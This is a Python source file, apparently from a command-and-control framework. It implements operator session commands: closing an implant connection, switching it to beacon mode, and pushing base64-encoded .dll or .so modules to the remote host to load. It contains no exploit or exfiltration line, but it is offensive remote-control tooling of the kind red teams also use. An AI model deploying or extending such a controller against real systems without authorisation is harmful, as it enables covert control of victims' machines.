# Modules/session/commands/control_commands.py

import ssl
from typing import Tuple
import colorama
import os
import readline
import json
import base64
from ..transfer import send_data
from ...global_objects import logger, tab_completion

class ControlCommands:
    """Handles session state and control commands."""
    
    def close_connection(self, conn: ssl.SSLSocket, r_address: Tuple[str, int]) -> None:
        """Closes the current session from within the session commands."""
        # Local import to prevent circular dependency
        from ..session import remove_connection_list

        logger.info(f"Closing connection {r_address[0]}:{r_address[1]}")
        
        confirm = input(colorama.Back.RED + "Are you sure you want to close the connection? (y/N): ").lower()
        if confirm == "y":
            print(colorama.Back.YELLOW + colorama.Fore.BLACK + f"Closing {r_address[0]}:{r_address[1]}")
            try:
                send_data(conn, "shutdown")
                logger.info(f"Sent shutdown command to {r_address[0]}:{r_address[1]}")
            except Exception as e:
                logger.error(f"Error sending shutdown command to {r_address}: {e}")
            
            remove_connection_list(r_address)
            conn.close()
            print(colorama.Back.GREEN + "Connection Closed")
        else:
            print(colorama.Back.GREEN + "Connection not closed.")
        return

    def change_beacon(self, conn: ssl.SSLSocket, r_address: Tuple[str, int], uuid) -> None:
        """Switches the current session into beacon mode."""
        # Local import to prevent circular dependency
        from ..session import remove_connection_list

        send_data(conn, "switch_beacon")
        logger.info(f"Sent 'switch to beacon mode' command to {r_address[0]}:{r_address[1]}")
        print(colorama.Fore.GREEN + f"Session {uuid} will now operate in beacon mode.")
        remove_connection_list(r_address)
        return
    
    def load_module_session(self, conn: ssl.SSLSocket, r_address: Tuple[str, int]) -> None:
        """Loads a module into the current session."""
        command_location = self.config['server']['module_location']
        try:
            platform_folder = 'windows' if 'windows' in self.operating_system else 'linux'
            ext = '.dll' if platform_folder == 'windows' else '.so'
            channel = 'debug' if 'debug' in self.operating_system else 'release'
            module_dir = os.path.join(command_location, platform_folder, channel)
            files = [f for f in os.listdir(module_dir) if f.endswith(ext)]
            module_names = [os.path.splitext(f)[0] for f in files]
            print("Available modules:")
            for name in module_names:
                print(f" - {name}")
        except Exception as e:
            logger.error(f"Error listing modules in {command_location}: {e}")
            print(f"Error listing modules in {command_location}: {e}")
            return
        readline.set_completer(
                lambda text, state: tab_completion(text, state, list(module_names) + ["exit"]))
        module_name = input("Enter the module name to load: ")
        if not module_name:
            print("No module name provided.")
            return
        if module_name in self.loaded_modules:
            print(f"Module '{module_name}' is already loaded.")
            return
        logger.debug(f"Loading module '{module_name}' from session.")
        self.load_module_direct_session(conn, r_address, module_name)
    
    def load_module_direct_session(self, conn: ssl.SSLSocket, r_address: Tuple[str, int], module_name: str) -> None:
        if "windows" in self.operating_system:
            if "debug" in self.operating_system:
                module_path = os.path.join(self.config['server']['module_location'], "windows", "debug", f"{module_name}.dll")
            else:
                module_path = os.path.join(self.config['server']['module_location'], "windows", "release", f"{module_name}.dll")
        elif "linux" in self.operating_system:
            if "debug" in self.operating_system:
                module_path = os.path.join(self.config['server']['module_location'], "linux", "debug", f"{module_name}.so")
            else:
                module_path = os.path.join(self.config['server']['module_location'], "linux", "release", f"{module_name}.so")
        else:
            logger.error(f"Unsupported operating system: {self.operating_system}")
            print(f"Unsupported operating system: {self.operating_system}")
            return
        logger.info(f"Loading module '{module_name}' from {module_path}")

        if module_name not in self.loaded_modules:
            self.loaded_modules.append(module_name)
        try:
            with open(module_path, "rb") as module_file:
                file_data = module_file.read()
                
            # Encode binary module data as base64 and serialize payload to JSON
            encoded_data = base64.b64encode(file_data).decode('ascii')
            payload = {"module": {"name": module_name, "data": encoded_data}}
            send_data(conn, json.dumps(payload))
            # Track loaded module
            if module_name not in self.loaded_modules:
                self.loaded_modules.append(module_name)
        except FileNotFoundError:
            logger.error(f"Module file '{module_path}' not found.")
            print(f"Module file '{module_path}' not found.")
        except Exception as e:
            logger.error(f"Error loading module '{module_name}': {e}")
            print(f"Error loading module '{module_name}': {e}")


